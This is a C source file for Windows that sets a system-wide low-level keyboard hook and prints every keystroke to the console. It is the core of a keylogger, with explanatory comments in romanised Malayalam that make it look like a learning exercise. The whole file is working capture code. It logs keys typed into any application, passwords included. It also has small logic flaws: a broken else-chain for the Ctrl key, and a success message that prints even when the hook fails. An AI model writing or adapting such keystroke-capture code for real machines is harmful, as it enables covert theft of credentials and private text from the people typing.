#include<windows.h>
#include<stdio.h>

LRESULT CALLBACK whattodo(int code,WPARAM wparam,LPARAM lparam)
{
    if(code >= 0 && wparam == WM_KEYDOWN){
      //lparam enn parayunnath oru int variable an athil "KBDLLHOOKSTRUCT"
      // ee structure ilot olla address an olllath but lparam is a int not pointer
      //athukond next il kbd enna oru pointer ine lparam thil olla value address ayit edukanam to that structure
      //
      KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lparam;
      //Some keys does not have Vritual key codes ,athukond \n
      //keyboard DLL hook enna structure ile vkCode vech olla key print akkum
      //hook ondakkumbo windows an ee value lparam thil idunath
      if(kbd->vkCode == 13){
               printf("\n[+]Key pressed --> Enter");

      } else if(kbd->vkCode == 9){
               printf("\n[+]Key pressed --> Tab");

      }else if(kbd->vkCode == 27){
               printf("\n[+]Key pressed --> Esc");

      }else if(kbd->vkCode == 16){
               printf("\n[+]Key pressed --> shift");
      }if(kbd->vkCode == VK_CONTROL ||
           kbd->vkCode == VK_LCONTROL ||
           kbd->vkCode == VK_RCONTROL)
    {
       printf("\n[+]Key pressed --> ctrl");

}else if(kbd->vkCode == 18){
               printf("\n[+] Key pressed --> Alt");

      }else if(kbd->vkCode == 8){
               printf("\n[+] Key pressed --> Backspace");

      }else if(kbd->vkCode == 32){
               printf("\n[+] Key pressed --> Space");

      }else if(kbd->vkCode == 37){
               printf("\n[+] Key pressed --> Left Arrow");

}else if(kbd->vkCode == 38){
    printf("\n[+] Key pressed --> Up Arrow");

}else if(kbd->vkCode == 39){
    printf("\n[+] Key pressed --> Right Arrow");

}else if(kbd->vkCode == 40){
    printf("\n[+] Key pressed --> Down Arrow");

}else if(kbd->vkCode == 20){
    printf("\n[+] Key pressed --> Caps Lock");

}else if(kbd->vkCode == 112){
    printf("\n[+] Key pressed --> F1");

}else if(kbd->vkCode == 113){
    printf("\n[+] Key pressed --> F2");

}else if(kbd->vkCode == 114){
    printf("\n[+] Key pressed --> F3");

}else if(kbd->vkCode == 115){
    printf("\n[+] Key pressed --> F4");

}else if(kbd->vkCode == 116){
    printf("\n[+] Key pressed --> F5");

}else if(kbd->vkCode == 117){
    printf("\n[+] Key pressed --> F6");

}else if(kbd->vkCode == 118){
    printf("\n[+] Key pressed --> F7");

}else if(kbd->vkCode == 119){
    printf("\n[+] Key pressed --> F8");

}else if(kbd->vkCode == 120){
    printf("\n[+] Key pressed --> F9");

}else if(kbd->vkCode == 121){
    printf("\n[+] Key pressed --> F10");

}else if(kbd->vkCode == 122){
    printf("\n[+] Key pressed --> F11");

}else if(kbd->vkCode == 123){
    printf("\n[+] Key pressed --> F12");

}else{
      char key_char = (char)MapVirtualKey(kbd->vkCode,MAPVK_VK_TO_CHAR);
      printf("\n[+]Key pressed --> %c",key_char);
    }
}
    return CallNextHookEx(NULL,code,wparam,lparam);

}
int main()
{
   HHOOK hook_key = SetWindowsHookEx(
      WH_KEYBOARD_LL,
      whattodo,
      GetModuleHandle(NULL),
      0
   );

   if(hook_key == NULL){
    printf("\n[+]An error occured while installing hook \n[+]%lu",GetLastError());
   }
   printf("[+]Hook installed sucessfully\n");
  
   MSG msg;
   while(GetMessage(&msg,NULL,0,0)){
      TranslateMessage(&msg);
      DispatchMessage(&msg);
   }
   UnhookWindowsHookEx(hook_key);
   return 0;
}
